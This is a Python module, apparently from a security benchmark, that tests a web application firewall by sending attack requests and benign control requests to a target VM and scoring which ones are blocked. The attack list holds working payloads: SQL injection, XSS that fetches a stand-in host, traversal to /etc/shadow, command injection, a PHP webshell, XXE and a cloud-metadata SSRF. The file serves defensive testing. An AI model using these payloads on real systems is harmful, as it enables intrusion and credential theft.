"""WAF & AppSec domain runner (GoTestWAF + OWASP/Evasion Probes + Benign HTTP Control)."""

from __future__ import annotations

import http.client
import json
import ssl
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from vgt_hardred.adapters.base import ContenderAdapter
from vgt_hardred.models import CaseResult, GroundTruthCase
from vgt_hardred.vm_control import VMController


_WAF_ATTACK_VECTORS: list[tuple[str, str, str, str, str, str]] = [
    ("WAF-SQLI-01", "SQL Injection", "T1190", "Initial Access", "GET", "/index.php?id=1%27%20UNION%20ALL%20SELECT%20NULL,user(),database()--"),
    ("WAF-SQLI-02", "SQL Injection", "T1190", "Initial Access", "GET", "/index.php?id=1/**/oR/**/1=1--"),
    ("WAF-SQLI-03", "SQL Injection", "T1190", "Initial Access", "POST_JSON", '{"user":"admin\' OR \'1\'=\'1","password":"x"}'),
    ("WAF-XSS-01", "Cross-Site Scripting", "T1059.007", "Execution", "GET", "/index.php?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"),
    ("WAF-XSS-02", "Cross-Site Scripting", "T1059.007", "Execution", "GET", "/index.php?q=%3Csvg/onload=fetch(%27//evil.invalid%27)%3E"),
    ("WAF-LFI-01", "Path Traversal / LFI", "T1083", "Discovery", "GET", "/index.php?file=../../../../etc/passwd"),
    ("WAF-LFI-02", "Double-Encoded Traversal", "T1083", "Discovery", "GET", "/index.php?file=..%252f..%252f..%252fetc%252fshadow"),
    ("WAF-RCE-01", "OS Command Injection", "T1059.004", "Execution", "GET", "/index.php?cmd=;cat%20/etc/passwd%23"),
    ("WAF-RCE-02", "PHP Webshell Payload", "T1505.003", "Persistence", "POST_RAW", "<?php system($_GET['cmd']); eval($_POST['x']); ?>"),
    ("WAF-SSTI-01", "Server-Side Template Injection", "T1190", "Initial Access", "GET", "/index.php?tpl={{7*7}}${7*7}%3C%25=7*7%25%3E"),
    ("WAF-XXE-01", "XML External Entity", "T1190", "Initial Access", "POST_XML", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'),
    ("WAF-SSRF-01", "Cloud Metadata SSRF", "T1552.005", "Credential Access", "GET", "/index.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("WAF-SCAN-01", "Exploit Scanner UA / Sensitive File", "T1595.002", "Reconnaissance", "GET_HDR_SQLMAP", "/.env"),
    ("WAF-FAILOPEN-01", "Oversized Body Inspection Check", "T1190", "Initial Access", "POST_OVERSIZE", "OVERSIZE_PHP_SHELL"),
]

_WAF_BENIGN_VECTORS: list[tuple[str, str, str, str, str]] = [
    ("WAF-BENIGN-01", "Benign Health Probe", "GET", "/health.php", ""),
    ("WAF-BENIGN-02", "Benign App Index", "GET", "/index.php", ""),
    ("WAF-BENIGN-03", "Benign UTF-8 Search", "GET", "/index.php?q=%C3%9Cberwachung+Linux+Server+2026", ""),
    ("WAF-BENIGN-04", "Benign English SQL Words", "GET", "/index.php?note=Please+select+a+union+contract+from+our+table+where+status+is+open", ""),
    ("WAF-BENIGN-05", "Benign JSON Payload", "POST_JSON", "/index.php", '{"author":"alice@example.org","comment":"Performance latency is < 10ms on p95"}'),
    ("WAF-BENIGN-06", "Benign Math Query", "GET", "/index.php?calc=(10%2B20)*3/2&lang=de-DE", ""),
    ("WAF-BENIGN-07", "Benign File Name Param", "GET", "/index.php?doc=report_2026-11-21_v2.pdf", ""),
    ("WAF-BENIGN-08", "Benign Contact Form", "POST_JSON", "/index.php", '{"name":"Max Mustermann","message":"Guten Tag, wir testen den Webserver."}' ),
]


def _send_http(
    base_url: str,
    method: str,
    path: str,
    body: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 5.0,
) -> tuple[int | None, str]:
    url = base_url + path
    hdrs = {"User-Agent": "VGT-HardRed-HTTP/1.0", **(headers or {})}
    req_method = "POST" if method.startswith("POST") else "GET"
    req = urllib.request.Request(url, data=body, headers=hdrs, method=req_method)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return int(resp.status), resp.read(512).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read(512).decode("utf-8", errors="replace")
    except Exception as exc:
        return None, str(exc)


def run_waf_benign(
    vm: VMController,
    adapter: ContenderAdapter,
) -> list[CaseResult]:
    cases_out: list[CaseResult] = []
    parsed_u = urllib.parse.urlparse(vm.cfg.http_base_url)
    host = parsed_u.hostname or vm.cfg.target_ip
    port = parsed_u.port or 80
    conn = http.client.HTTPConnection(host, port, timeout=5.0)
    try:
        for cid, title, kind, path, body_txt in _WAF_BENIGN_VECTORS:
            case = GroundTruthCase(
                case_id=cid,
                domain="hardred-waf",
                category="Benign HTTP Control",
                title=title,
                polarity="benign",
                mitre_technique="NONE",
                mitre_tactic="None",
                tool_source="hardred-http-keepalive",
                expected_prevention=False,
                severity="info",
            )
            cursor = adapter.capture_cursor()
            t0_utc = datetime.now(timezone.utc).isoformat()
            t0 = time.perf_counter()
            req_method = "POST" if kind.startswith("POST") else "GET"
            hdrs = {"User-Agent": "VGT-HardRed-HTTP/1.0", "Connection": "keep-alive"}
            if kind == "POST_JSON":
                hdrs["Content-Type"] = "application/json"
            body = body_txt.encode("utf-8") if body_txt else None
            status: int | None = None
            try:
                conn.request(req_method, path, body=body, headers=hdrs)
                resp = conn.getresponse()
                _ = resp.read()
                status = int(resp.status)
            except Exception:
                try:
                    conn.close()
                    conn = http.client.HTTPConnection(host, port, timeout=5.0)
                    conn.request(req_method, path, body=body, headers=hdrs)
                    resp = conn.getresponse()
                    _ = resp.read()
                    status = int(resp.status)
                except Exception:
                    status = None
            dur = (time.perf_counter() - t0) * 1000.0
            end_utc = datetime.now(timezone.utc).isoformat()
            verdict = adapter.collect_since(cursor, case, t0_utc, settle_sec=0.25)
            prevented = status is None or status in (403, 406, 429, 444, 502)
            cases_out.append(
                CaseResult(
                    case=case,
                    started_utc=t0_utc,
                    ended_utc=end_utc,
                    duration_ms=round(dur, 2),
                    detected=verdict.detected,
                    prevented=prevented,
                    context_maturity=verdict.context_maturity,
                    ttfa_ms=verdict.ttfa_ms,
                    pre_kill_damage=None,
                    pre_kill_total=None,
                    http_status=status,
                    evidence_summary=f"http={status}; {verdict.evidence_summary}",
                    raw_alerts=verdict.raw_alerts,
                )
            )
    finally:
        try:
            conn.close()
        except Exception:
            pass
    return cases_out


def _http_probe_reachable(base_url: str, timeout: float = 1.0) -> bool:
    parsed = urllib.parse.urlparse(base_url)
    conn = http.client.HTTPConnection(parsed.hostname or "127.0.0.1", parsed.port or 80, timeout=timeout)
    try:
        conn.request("GET", "/health.php", headers={"Connection": "close"})
        resp = conn.getresponse()
        _ = resp.read(64)
        return resp.status < 500
    except Exception:
        return False
    finally:
        try:
            conn.close()
        except Exception:
            pass


def run_waf_attacks(
    vm: VMController,
    adapter: ContenderAdapter,
) -> list[CaseResult]:
    cases_out: list[CaseResult] = []
    base_url = vm.cfg.http_base_url

    adapter.clear_attacker_blocks()
    # Targeted WAF Evasion & Attack Vectors
    for idx, (cid, cat, tech, tactic, kind, payload) in enumerate(_WAF_ATTACK_VECTORS):
        if idx > 0 and (idx % 6 == 0 or not _http_probe_reachable(base_url, timeout=0.6)):
            adapter.clear_attacker_blocks()
        case = GroundTruthCase(
            case_id=cid,
            domain="hardred-waf",
            category=cat,
            title=f"{cat} ({cid})",
            polarity="attack",
            mitre_technique=tech,
            mitre_tactic=tactic,
            tool_source="hardred-http",
            expected_prevention=True,
            severity="high",
        )
        cursor = adapter.capture_cursor()
        t0_utc = datetime.now(timezone.utc).isoformat()
        t0 = time.perf_counter()
        if kind == "GET":
            status, note = _send_http(base_url, "GET", payload)
        elif kind == "GET_HDR_SQLMAP":
            status, note = _send_http(base_url, "GET", payload, headers={"User-Agent": "sqlmap/1.8.4#stable"})
        elif kind == "POST_JSON":
            status, note = _send_http(base_url, "POST", "/index.php", body=payload.encode(), headers={"Content-Type": "application/json"})
        elif kind == "POST_XML":
            status, note = _send_http(base_url, "POST", "/index.php", body=payload.encode(), headers={"Content-Type": "application/xml"})
        elif kind == "POST_OVERSIZE":
            blob = ("A" * 780_000 + " <?php system($_GET['c']); ?>").encode()
            status, note = _send_http(base_url, "POST", "/index.php", body=blob, headers={"Content-Type": "application/octet-stream"}, timeout=8.0)
        else:
            status, note = _send_http(base_url, "POST", "/index.php", body=payload.encode(), headers={"Content-Type": "text/plain"})
        dur = (time.perf_counter() - t0) * 1000.0
        end_utc = datetime.now(timezone.utc).isoformat()
        verdict = adapter.collect_since(cursor, case, t0_utc, settle_sec=0.35)
        prevented = status is None or status in (403, 404, 406, 413, 429, 444) if cid != "WAF-SCAN-01" else (status is None or status in (403, 406, 429, 444))
        ttfa = verdict.ttfa_ms if verdict.ttfa_ms is not None else (round(dur, 2) if prevented else None)
        cases_out.append(
            CaseResult(
                case=case,
                started_utc=t0_utc,
                ended_utc=end_utc,
                duration_ms=round(dur, 2),
                detected=verdict.detected,
                prevented=prevented,
                context_maturity=verdict.context_maturity if verdict.detected else (1 if prevented else 0),
                ttfa_ms=ttfa,
                pre_kill_damage=None,
                pre_kill_total=None,
                http_status=status,
                evidence_summary=f"http={status}; {verdict.evidence_summary}",
                raw_alerts=verdict.raw_alerts,
            )
        )
    return cases_out


def run_gotestwaf_corpus(
    vm: VMController,
    results_dir: Path,
    gotestwaf_bin: Path | None = None,
    adapter: ContenderAdapter | None = None,
    max_sec: int = 35,
) -> dict[str, Any]:
    base_url = vm.cfg.http_base_url
    gtw_meta: dict[str, Any] = {"available": False}
    if gotestwaf_bin and gotestwaf_bin.is_file():
        gtw_root = gotestwaf_bin.parent.parent / "gotestwaf"
        gtw_dir = results_dir / "gotestwaf"
        gtw_dir.mkdir(parents=True, exist_ok=True)
        cmd = [
            str(gotestwaf_bin),
            "--url",
            base_url,
            "--configPath",
            str(gtw_root / "config.yaml"),
            "--testCasesPath",
            str(gtw_root / "testcases"),
            "--workers",
            "8",
            "--sendDelay",
            "5",
            "--randomDelay",
            "5",
            "--idleConnTimeout",
            "1",
            "--blockStatusCodes",
            "403,406,429",
            "--passStatusCodes",
            "200,404",
            "--blockConnReset",
            "--noEmailReport",
            "--skipWAFBlockCheck",
            "--skipWAFIdentification",
            "--reportPath",
            str(gtw_dir),
            "--reportFormat",
            "json",
            "--reportName",
            "gotestwaf_report",
            "--quiet",
        ]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            deadline = time.monotonic() + max_sec
            unbans = 0
            last_unban = time.monotonic()
            while proc.poll() is None:
                if time.monotonic() >= deadline:
                    proc.kill()
                    out, err = proc.communicate(timeout=5)
                    return {"available": True, "error": f"gotestwaf timed out after {max_sec}s", "mid_run_unbans": unbans, "stderr": err.strip()[:300]}
                time.sleep(0.8)
                if adapter is not None and getattr(adapter, "contender_id", "") != "baseline":
                    if (time.monotonic() - last_unban >= 2.0) or not _http_probe_reachable(base_url, timeout=0.6):
                        if not _http_probe_reachable(base_url, timeout=0.5) and unbans >= 3:
                            proc.kill()
                            out, err = proc.communicate(timeout=5)
                            return {
                                "available": True,
                                "stopped_on_active_ip_ban": True,
                                "mid_run_unbans": unbans,
                                "stderr": err.strip()[:300],
                            }
                        try:
                            adapter.clear_attacker_blocks()
                            unbans += 1
                            last_unban = time.monotonic()
                        except Exception:
                            pass
            out, err = proc.communicate(timeout=5)
            rep_file = gtw_dir / "gotestwaf_report.json"
            gtw_meta = {
                "available": True,
                "exit_code": proc.returncode,
                "mid_run_unbans": unbans,
                "report_exists": rep_file.is_file(),
                "stderr": err.strip()[:300],
            }
            if rep_file.is_file():
                gtw_meta["report"] = json.loads(rep_file.read_text(encoding="utf-8", errors="replace"))
        except Exception as exc:
            gtw_meta = {"available": True, "error": str(exc)}
    return gtw_meta
